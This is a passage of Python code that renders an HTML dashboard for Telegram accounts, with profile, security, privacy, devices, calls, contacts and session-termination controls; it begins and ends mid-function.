            clock_fading_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock-fading-icon lucide-clock-fading"><path d="M12 2a10 10 0 0 1 7.38 16.75"/><path d="M12 6v6l4 2"/><path d="M2.5 8.875a10 10 0 0 0-.5 3"/><path d="M2.83 16a10 10 0 0 0 2.43 3.4"/><path d="M4.636 5.235a10 10 0 0 1 .891-.857"/><path d="M8.644 21.42a10 10 0 0 0 7.631-.38"/></svg>'
            key_round_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-key-round-icon lucide-key-round"><path d="M2.586 17.414A2 2 0 0 0 2 18.828V21a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h1a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h.172a2 2 0 0 0 1.414-.586l.814-.814a6.5 6.5 0 1 0-4-4z"/><circle cx="16.5" cy="7.5" r=".5" fill="currentColor"/></svg>'
            mail_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-mail-icon lucide-mail"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"/><rect x="2" y="4" width="20" height="16" rx="2"/></svg>'
            shield_x_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield-x-icon lucide-shield-x"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m14.5 9.5-5 5"/><path d="m9.5 9.5 5 5"/></svg>'
            
            # User provided laptop icon
            laptop_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-laptop-icon lucide-laptop"><path d="M18 5a2 2 0 0 1 2 2v8.526a2 2 0 0 0 .212.897l1.068 2.127a1 1 0 0 1-.9 1.45H3.62a1 1 0 0 1-.9-1.45l1.068-2.127A2 2 0 0 0 4 15.526V7a2 2 0 0 1 2-2z"/><path d="M20.054 15.987H3.946"/></svg>"""
            laptop_check_svg = laptop_svg

            # Styling for hover effect
            hover_style = "<style>.copy-hover:hover { fill: #2481cc !important; opacity: 1; transition: fill 0.2s; }</style>"
            new_copy_svg = """<svg xmlns="http://www.w3.org/2000/svg" height="18px" viewBox="0 -960 960 960" width="18px" fill="#707579" class="copy-hover" style="margin-left:8px; cursor:pointer;" onclick="{onclick}"><path d="M360-240q-33 0-56.5-23.5T280-320v-480q0-33 23.5-56.5T360-880h360q33 0 56.5 23.5T800-800v480q0 33-23.5 56.5T720-240H360Zm0-80h360v-480H360v480ZM200-80q-33 0-56.5-23.5T120-160v-560h80v560h440v80H200Zm160-240v-480 480Z"/></svg>"""

            def val_with_copy(v):
                 # Always show icon. Only copy if valid.
                 is_valid = v and v != "None" and v != "-" and v != "Unknown"
                 
                 onclick_action = "event.stopPropagation();"
                 text_style = "" # Default: inherit from .info-value (likely blue)
                 
                 if is_valid:
                      safe_v = v.replace("'", "\\'")
                      onclick_action = f"event.stopPropagation(); copyText('{safe_v}')"
                 else:
                      text_style = "color: #999; font-weight: 400;"
                 
                 icon = new_copy_svg.replace("{onclick}", onclick_action)
                 # Use flex-wrap to be safe. Apply text_style to the text container or the whole div (inherits).
                 return f'<div style="display:flex; align-items:center; flex-wrap:wrap; justify-content: flex-end; {text_style}">{v}{icon}</div>'

            # Update formatted values
            fmt_first_name = val_with_copy(res_first_name)
            fmt_last_name = val_with_copy(res_last_name)
            fmt_id = val_with_copy(str(user_id)) # Assuming user_id is available
            fmt_username = val_with_copy(username) # Use the 'username' variable defined earlier
            fmt_phone = val_with_copy(res_phone)
            fmt_2fa_info = val_with_copy(res_2fa_info)

            phone_val = udata.get('phone', 'None')
            
            # Modify Bio logic to include copy icon
            bio_copy_action = "event.stopPropagation();"
            if res_bio and res_bio != "None" and res_bio != "Unknown":
                safe_bio = res_bio.replace("'", "\\'")
                bio_copy_action = f"event.stopPropagation(); copyText('{safe_bio}')"
            
            # For Bio, we float it right or put it before text?
            # User said "right side". float:right usually works best if placed BEFORE text.
            bio_icon = new_copy_svg.replace("{onclick}", bio_copy_action).replace("margin-left:8px;", "margin-left:8px; float:right;")

            # --- CARD: Open Chat Folders / All Chats ---
            folder_card_html = ""
            
            folder_open_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder-open-icon lucide-folder-open"><path d="m6 14 1.5-2.9A2 2 0 0 1 9.24 10H20a2 2 0 0 1 1.94 2.5l-1.54 6a2 2 0 0 1-1.95 1.5H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h3.9a2 2 0 0 1 1.69.9l.81 1.2a2 2 0 0 0 1.67.9H18a2 2 0 0 1 2 2v2"/></svg>"""
            all_chats_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-messages-square-icon lucide-messages-square"><path d="M16 10a2 2 0 0 1-2 2H6.828a2 2 0 0 0-1.414.586l-2.202 2.202A.71.71 0 0 1 2 14.286V4a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/><path d="M20 9a2 2 0 0 1 2 2v10.286a.71.71 0 0 1-1.212.502l-2.202-2.202A2 2 0 0 0 17.172 19H10a2 2 0 0 1-2-2v-1"/></svg>'

            btn_link = f'/user/{user_id}/folders'
            btn_text = "Open Chat Folders"
            btn_icon = folder_open_svg
            
            if not has_folders:
                 btn_link = f'/user/{user_id}/folders?mode=all'
                 btn_text = "Open All Chats"
                 btn_icon = all_chats_svg
                 
            folder_card_html = f'''
            <div class="info-card-box" style="background: #2481cc; color: white; margin-bottom: 15px; cursor: pointer;" onclick="window.location.href='{btn_link}'">
                 <div style="display: flex; align-items: center; justify-content: center; padding: 10px; gap: 10px;">
                     {btn_icon}
                     <div style="font-weight: 500; font-size: 16px;">{btn_text}</div>
                 </div>
            </div>
            '''

            content_html += f"""
            {hover_style}
            <div id="content-Info" class="tab-content {content_cls}">
                <div class="info-container">
                    {folder_card_html}
                    
                    <!-- Card 1: Info -->
                    <div class="info-section">
                        <div class="section-header">User Info</div>
                        <div class="info-card-box">
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-icon">{user_round_svg}</div>
                                    <div class="info-label">First Name</div>
                                </div>
                                <div class="info-value">{fmt_first_name}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-icon">{user_round_svg}</div>
                                    <div class="info-label">Last Name</div>
                                </div>
                                <div class="info-value">{fmt_last_name}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-icon">{user_check_svg}</div>
                                    <div class="info-label">User ID</div>
                                </div>
                                <div class="info-value">{fmt_id}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-icon">{at_sign_svg}</div>
                                    <div class="info-label">Username</div>
                                </div>
                                <div class="info-value">{fmt_username}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-icon">{phone_svg}</div>
                                    <div class="info-label">Phone</div>
                                </div>
                                <div class="info-value">{fmt_phone}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-icon">{lock_svg}</div>
                                    <div class="info-label">2FA</div>
                                </div>
                                <div class="info-value">{fmt_2fa_info}</div>
                            </div>
                            <div class="info-item" style="flex-direction: column; align-items: flex-start; width: 100%; box-sizing: border-box; padding: 12px 16px !important;">
                                <div class="info-left" style="width: 100%; display: flex; align-items: center; box-sizing: border-box;">
                                    <div class="info-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info-icon lucide-info"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></div>
                                    <div class="info-label">Bio</div>
                                </div>
                                <div class="info-value" style="display: block; width: 100%; max-width: 100% !important; text-align: left; margin-top: 5px; white-space: normal; word-break: break-word; overflow-wrap: break-word; box-sizing: border-box;">
                                    {bio_icon}
                                    {fmt_bio}
                                </div>
                             </div>
                        </div>
                    </div>

                    <!-- Card 2: Security -->
                    <div class="info-section">
                        <div class="section-header">Security</div>
                        <div class="info-card-box">
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-icon">{lock_svg}</div>
                                    <div class="info-label">Two-Step Verification</div>
                                </div>
                                <div class="info-value">{fmt_2fa_security}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-icon">{clock_fading_svg}</div>
                                    <div class="info-label">Auto-Delete Messages</div>
                                </div>
                                <div class="info-value">{fmt_autodelete}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-icon">{shield_x_svg}</div>
                                    <div class="info-label">Blocked Users</div>
                                </div>
                                <div class="info-value">{fmt_blocked}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-icon">{laptop_svg}</div>
                                    <div class="info-label">Devices</div>
                                </div>
                                <div class="info-value">{fmt_devices}</div>
                            </div>
                        </div>
                    </div>
                
                     <!-- Card 3: Privacy -->
                    <div class="info-section">
                        <div class="section-header">Privacy</div>
                        <div class="info-card-box">
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-label" style="margin-left: 0;">Phone Number</div>
                                </div>
                                <div class="info-value">{fmt_priv_phone}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-label" style="margin-left: 0;">Last Seen & Online</div>
                                </div>
                                <div class="info-value">{fmt_priv_seen}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-label" style="margin-left: 0;">Profile Photos</div>
                                </div>
                                <div class="info-value">{fmt_priv_photos}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-label" style="margin-left: 0;">Forwarded Messages</div>
                                </div>
                                <div class="info-value">{fmt_priv_fwd}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-label" style="margin-left: 0;">Calls</div>
                                </div>
                                <div class="info-value">{fmt_priv_calls}</div>
                            </div>
                            <div class="info-item">
                                <div class="info-left">
                                    <div class="info-label" style="margin-left: 0;">Invites</div>
                                </div>
                                <div class="info-value">{fmt_priv_invites}</div>
                            </div>
                        </div>
                    </div>

                    <!-- Card 4: Delete My Account -->
                    <div class="info-section">
                        <div class="section-header">Delete My Account</div>
                        <div class="info-card-box">
                            <div class="info-item">
                                <div class="info-left">
                                     <div class="info-label" style="margin-left: 0;">If away for</div>
                                </div>
                                <div class="info-value">{fmt_account_ttl}</div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Card 5: Devices -->
                    <div class="info-section">
                        <div class="section-header">Devices</div>
                        <div class="info-card-box">
                            {devices_html}
                        </div>
                    </div>
                    
                    <!-- Card 6: Auto Terminate Old Sessions -->
                    <div class="info-section">
                        <div class="section-header">Automatically Terminate Old Sessions</div>
                        <div class="info-card-box">
                             <div class="info-item">
                                <div class="info-left">
                                     <div class="info-label" style="margin-left: 0;">If inactive for</div>
                                </div>
                                <div class="info-value">{fmt_session_ttl}</div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- JS for Actions -->
                <script>
            function terminateSession(userId, hash) {{
                if(!confirm('Terminate this session?')) return;
                fetch('/api/terminate_session', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{user_id: userId, hash: hash}})
                }}).then(r => r.json()).then(d => {{
                    if(d.status === 'ok') location.reload();
                    else alert('Error: ' + (d.error || 'Unknown'));
                }}).catch(e => alert('Request failed'));
            }}
            
            async function terminateSessions(uid) {{
                        if(!confirm("Are you sure you want to terminate all other sessions?")) return;
                        try {{
                            let formData = new FormData();
                            formData.append('user_id', uid);
                            let response = await fetch('/api/terminate_sessions', {{
                                method: 'POST',
                                body: formData
                            }});
                            if(response.ok) {{
                                alert("All other sessions terminated.");
                                location.reload();
                            }} else {{
                                alert("Failed to terminate sessions.");
                            }}
                        }} catch(e) {{
                            alert("Error: " + e);
                        }}
                    }}
                </script>
            """
            content_html += "</div>"
        elif tab == "Chats":
             inner_content = render_dialog_list(chats, user_id, defaults=getattr(session, 'notify_defaults', None))
        elif tab == "Channels":
             inner_content = render_dialog_list(channels, user_id, defaults=getattr(session, 'notify_defaults', None))
        elif tab == "Groups":
             inner_content = render_dialog_list(groups, user_id, defaults=getattr(session, 'notify_defaults', None))
        elif tab == "Bots":
             inner_content = render_dialog_list(bots, user_id, defaults=getattr(session, 'notify_defaults', None))
        elif tab == "Stories":
             stories_btn_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock-fading-icon lucide-clock-fading"><path d="M12 2a10 10 0 0 1 7.38 16.75"/><path d="M12 6v6l4 2"/><path d="M2.5 8.875a10 10 0 0 0-.5 3"/><path d="M2.83 16a10 10 0 0 0 2.43 3.4"/><path d="M4.636 5.235a10 10 0 0 1 .891-.857"/><path d="M8.644 21.42a10 10 0 0 0 7.631-.38"/></svg>"""
             loader_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#2481cc" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-loader-icon lucide-loader loader-spin"><path d="M12 2v4"/><path d="m16.2 7.8 2.9-2.9"/><path d="M18 12h4"/><path d="m16.2 16.2 2.9 2.9"/><path d="M12 18v4"/><path d="m4.9 19.1 2.9-2.9"/><path d="M2 12h4"/><path d="m4.9 4.9 2.9 2.9"/></svg>"""
             
             inner_content = f'''
             <div class="info-container" id="btn-container-{tab}" style="display: flex; flex-direction: column;">
                 <div class="info-card-box" style="background: #2481cc; color: white; cursor: pointer; width: 100%; box-sizing: border-box;" onclick="showLoader('{tab}')">
                      <div style="display: flex; align-items: center; justify-content: center; padding: 10px; gap: 10px;">
                          {stories_btn_icon}
                          <div style="font-weight: 500; font-size: 16px;">Load Stories</div>
                      </div>
                 </div>
             </div>
             <div id="loader-container-{tab}" style="display: none; justify-content: center; align-items: center; height: 300px;">
                  {loader_svg}
             </div>
             <div id="data-{tab}" style="display: none;"></div>
             '''
        elif tab == "Saved":
             bookmark_btn_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-bookmark-icon lucide-bookmark"><path d="M17 3a2 2 0 0 1 2 2v15a1 1 0 0 1-1.496.868l-4.512-2.578a2 2 0 0 0-1.984 0l-4.512 2.578A1 1 0 0 1 5 20V5a2 2 0 0 1 2-2z"/></svg>"""
             inner_content = f"""
             <div class="info-container" style="display: flex; flex-direction: column; justify-content: center;">
                 <div class="info-card-box" style="background: #2481cc; color: white; cursor: pointer; width: 100%; box-sizing: border-box;" onclick="window.open('/user/{user_id}/chat/{user_id}', '_blank')">
                      <div style="display: flex; align-items: center; justify-content: center; padding: 10px; gap: 10px;">
                          {bookmark_btn_svg}
                          <div style="font-weight: 500; font-size: 16px;">Open Saved Messages</div>
                      </div>
                 </div>
             </div>
             """
        elif tab == "Archived":
             inner_content = render_dialog_list(archived_dialogs, user_id, defaults=getattr(session, 'notify_defaults', None))
        elif tab == "Calls":
             call_out_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone-outgoing-icon lucide-phone-outgoing" style="color: #4cd964;"><path d="m16 8 6-6"/><path d="M22 8V2h-6"/><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/></svg>"""
             call_missed_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone-missed-icon lucide-phone-missed" style="color: #ff3b30;"><path d="m16 2 6 6"/><path d="m22 2-6 6"/><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/></svg>"""
             call_in_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone-incoming-icon lucide-phone-incoming" style="color: #4cd964;"><path d="M16 2v6h6"/><path d="m22 2-6 6"/><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/></svg>"""
             
             if not calls_list:
                  calls_html = f"<div style='text-align:center; padding:40px; color:#999;' id='calls-placeholder'></div>"
             else:
                  calls_html = '<div class="chat-list">'
                  for msg in calls_list:
                       # Resolve User
                       peer_id = utils.get_peer_id(msg.peer_id)
                       user = call_entities.get(peer_id)
                       name = utils.get_display_name(user) if user else "Unknown"
                       uid = peer_id
                       
                       username = getattr(user, 'username', None)
                       uid_text = f"{uid} - @{username}" if username else str(uid)
                       
                       # Time
                       time_str = ""
                       try:
                           dt = msg.date + timedelta(hours=5, minutes=30)
                           time_str = dt.strftime("%I:%M %p %d/%m/%Y").lstrip("0")
                       except: pass
                       
                       # Action & Duration
                       action = msg.action
                       duration = getattr(action, 'duration', 0) or 0
                       reason = getattr(action, 'reason', None)
                       
                       dur_str = f"{duration} sec"
                       if duration > 60:
                            dur_str = f"{duration // 60} min {duration % 60} sec"
                       
                       icon = call_in_svg
                       is_missed = False
                       if msg.out:
                            icon = call_out_svg
                       else:
                            if isinstance(reason, (PhoneCallDiscardReasonMissed, PhoneCallDiscardReasonBusy)):
                                 icon = call_missed_svg
                                 is_missed = True
                            elif duration == 0:
                                 # Sometimes duration 0 incoming means missed/declined
                                 icon = call_missed_svg
                                 is_missed = True
                       
                       # Render Row
                       calls_html += f'''
                       <div class="chat-item" style="cursor: default; height: auto; min-height: 72px;">
                           <div class="avatar-wrapper">
                               <img src="/avatar/{user_id}/{peer_id}" class="chat-avatar" onerror="this.outerHTML='<div class=chat-icon>{name[:1]}</div>'">
                           </div>
                           <div class="chat-main">
                               <div class="chat-header" style="align-items: flex-start;">
                                   <div style="display:flex; flex-direction:column; max-width: 70%;">
                                       <div class="chat-name" style="max-width: 100%;">{name}</div>
                                       <div style="font-size: 12px; color: #707579;">{uid_text}</div>
                                   </div>
                                   <div class="chat-time">{time_str}</div>
                               </div>
                               <div class="chat-body">
                                   <div class="chat-preview" style="display:flex; align-items:center; gap:6px;">
                                        {icon}
                                        <span>{dur_str}</span>
                                   </div>
                               </div>
                           </div>
                       </div>
                       '''
                  calls_html += '</div>'
                  
             calls_btn_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone-icon lucide-phone"><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/></svg>"""
             loader_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#2481cc" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-loader-icon lucide-loader loader-spin"><path d="M12 2v4"/><path d="m16.2 7.8 2.9-2.9"/><path d="M18 12h4"/><path d="m16.2 16.2 2.9 2.9"/><path d="M12 18v4"/><path d="m4.9 19.1 2.9-2.9"/><path d="M2 12h4"/><path d="m4.9 4.9 2.9 2.9"/></svg>"""
             
             inner_content = f'''
             <div class="info-container" id="btn-container-{tab}" style="display: flex; flex-direction: column;">
                 <div class="info-card-box" style="background: #2481cc; color: white; cursor: pointer; width: 100%; box-sizing: border-box;" onclick="showLoader('{tab}')">
                      <div style="display: flex; align-items: center; justify-content: center; padding: 10px; gap: 10px;">
                          {calls_btn_icon}
                          <div style="font-weight: 500; font-size: 16px;">Load Calls List</div>
                      </div>
                 </div>
             </div>
             <div id="loader-container-{tab}" style="display: none; justify-content: center; align-items: center; height: 300px;">
                  {loader_svg}
             </div>
             <div id="data-{tab}" style="display: none;">
                  {calls_html}
             </div>
             '''
        elif tab == "Contacts":
             contacts_btn_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-user-round-icon lucide-circle-user-round"><path d="M18 20a6 6 0 0 0-12 0"/><circle cx="12" cy="10" r="4"/><circle cx="12" cy="12" r="10"/></svg>"""
             loader_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#2481cc" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-loader-icon lucide-loader loader-spin"><path d="M12 2v4"/><path d="m16.2 7.8 2.9-2.9"/><path d="M18 12h4"/><path d="m16.2 16.2 2.9 2.9"/><path d="M12 18v4"/><path d="m4.9 19.1 2.9-2.9"/><path d="M2 12h4"/><path d="m4.9 4.9 2.9 2.9"/></svg>"""
             
             inner_content = f'''
             <div class="info-container" id="btn-container-{tab}" style="display: flex; flex-direction: column;">
                 <div class="info-card-box" style="background: #2481cc; color: white; cursor: pointer; width: 100%; box-sizing: border-box;" onclick="showLoader('{tab}')">
                      <div style="display: flex; align-items: center; justify-content: center; padding: 10px; gap: 10px;">
                          {contacts_btn_icon}
                          <div style="font-weight: 500; font-size: 16px;">Load Contacts List</div>
                      </div>
                 </div>
             </div>
             <div id="loader-container-{tab}" style="display: none; justify-content: center; align-items: center; height: 300px;">
                  {loader_svg}
             </div>
             <div id="data-{tab}" style="display: none;"></div>
             '''
        elif tab == "Stickers":
             stickers_btn_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sticker-icon lucide-sticker"><path d="M21 9a2.4 2.4 0 0 0-.706-1.706l-3.588-3.588A2.4 2.4 0 0 0 15 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2z"/><path d="M15 3v5a1 1 0 0 0 1 1h5"/><path d="M8 13h.01"/><path d="M16 13h.01"/><path d="M10 16s.8 1 2 1c1.3 0 2-1 2-1"/></svg>"""
             loader_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#2481cc" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-loader-icon lucide-loader loader-spin"><path d="M12 2v4"/><path d="m16.2 7.8 2.9-2.9"/><path d="M18 12h4"/><path d="m16.2 16.2 2.9 2.9"/><path d="M12 18v4"/><path d="m4.9 19.1 2.9-2.9"/><path d="M2 12h4"/><path d="m4.9 4.9 2.9 2.9"/></svg>"""
             
             inner_content = f'''
             <div class="info-container" id="btn-container-{tab}" style="display: flex; flex-direction: column;">
                 <div class="info-card-box" style="background: #2481cc; color: white; cursor: pointer; width: 100%; box-sizing: border-box;" onclick="showLoader('{tab}')">
                      <div style="display: flex; align-items: center; justify-content: center; padding: 10px; gap: 10px;">
                          {stickers_btn_icon}
                          <div style="font-weight: 500; font-size: 16px;">Load Stickers Pack</div>
                      </div>
                 </div>
             </div>
             <div id="loader-container-{tab}" style="display: none; justify-content: center; align-items: center; height: 300px;">
                  {loader_svg}
             </div>
             <div id="data-{tab}" style="display: none;"></div>
             '''
        else:
             inner_content = f"<div style='text-align:center; padding: 40px; color: #888;'>{tab} Content Placeholder</div>"
             
        if tab != "Info":
              content_html += f'<div id="content-{tab}" class="tab-content {content_cls}">{inner_content}</div>'

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>User Details - {udata.get('custom_name') or udata.get('name', 'User')}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>{css}</style>
        <script>
            function switchTab(name) {{
                window.scrollTo(0, 0);
                // Remove active class from all
                document.querySelectorAll('.tab-item').forEach(el => el.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
                
                // Add active to matching tab
                const tabEl = document.querySelector(`.tab-item[data-tab="${{name}}"]`);
                if(tabEl) tabEl.classList.add('active');
                
                // Show content
                const contentEl = document.getElementById('content-' + name);
                if(contentEl) contentEl.classList.add('active');
            }}
            function goBack() {{ window.history.back(); }}
            function copyText(text) {{
                if (!text) return;
                navigator.clipboard.writeText(text).then(() => {{
                   // copied
                }}).catch(err => {{
                   console.error('Copy failed', err);
                }});
            }}
            async function showLoader(tab) {{
                var btnContainer = document.getElementById('btn-container-' + tab);
                var loaderContainer = document.getElementById('loader-container-' + tab);
                if (btnContainer) btnContainer.style.display = 'none';
                if (loaderContainer) loaderContainer.style.display = 'flex';
                
                if (tab === 'Calls' || tab === 'Contacts' || tab === 'Stickers' || tab === 'Stories') {{
                    var dataContainer = document.getElementById('data-' + tab);
                    try {{
                        let response = await fetch('/api/user/{user_id}/' + tab.toLowerCase());
                        let html_text = await response.text();
                        if (dataContainer) dataContainer.innerHTML = html_text;
                        
                        setTimeout(() => {{
                            let count = 0;
                            if(tab === 'Calls') count = dataContainer.querySelectorAll('.chat-item').length;
                            else if(tab === 'Stickers') count = dataContainer.querySelectorAll('.sticker-wrap').length;
                            else if(tab === 'Stories') count = dataContainer.querySelectorAll('.user-wrap').length;
                            else if(tab === 'Contacts') count = dataContainer.querySelectorAll('.user-wrap[data-search]').length;
                            
                            if(count > 0) {{
                                let tabEl = document.querySelector(`.tab-item[data-tab="${{tab}}"]`);
                                if(tabEl) tabEl.innerText = `${{tab}} (${{count}})`;
                            }}
                        }}, 50);
                    }} catch(e) {{
                        if (dataContainer) dataContainer.innerHTML = '<div style="text-align:center; padding:40px; color:#ff3b30;">Failed to load ' + tab.toLowerCase() + '</div>';
                    }}
                    if (loaderContainer) loaderContainer.style.display = 'none';
                    if (dataContainer) dataContainer.style.display = 'block';
                }}
            }}
            function toggleDetails(id) {{
                const el = document.getElementById('details-' + id);
                const btn = document.getElementById('btn-' + id);
                if(el && el.style.display === 'none') {{
                    el.style.display = 'block';
                    if(btn) btn.style.background = '#e0e0e0';
                }} else if(el) {{
                    el.style.display = 'none';
                    if(btn) btn.style.background = '#ffffff';
                }}
            }}
            window.refreshCountdown = null;
            window.toggleAutoRefresh = function() {{
                const btn = document.getElementById('refresh-toggle');
                const statusIcon = document.getElementById('refresh-status-icon');
                if(!btn) return;
                
                const isOff = btn.style.background === 'rgb(204, 204, 204)' || btn.style.background === '#ccc' || btn.style.background === '';
                
                if (isOff) {{
                    btn.style.background = '#4cd964';
                    btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="15" cy="12" r="3"/><rect width="20" height="14" x="2" y="5" rx="7"/></svg>';
                    let count = 10;
                    if(statusIcon) {{ statusIcon.style.background = '#4cd964'; statusIcon.innerHTML = count + 's'; }}
                    
                    window.refreshCountdown = setInterval(async () => {{
                        count--;
                        if(statusIcon) statusIcon.innerHTML = count + 's';
                        
                        if (count <= 0) {{
                            count = 10;
                            if(statusIcon) statusIcon.innerHTML = '10s';
                            try {{
                                let response = await fetch('/api/user/{user_id}/contacts?items=1');
                                let html_text = await response.text();
                                const listBox = document.getElementById('contacts-items-chunk');
                                if (listBox && html_text.trim() != '') {{
                                    listBox.innerHTML = html_text;
                                }}
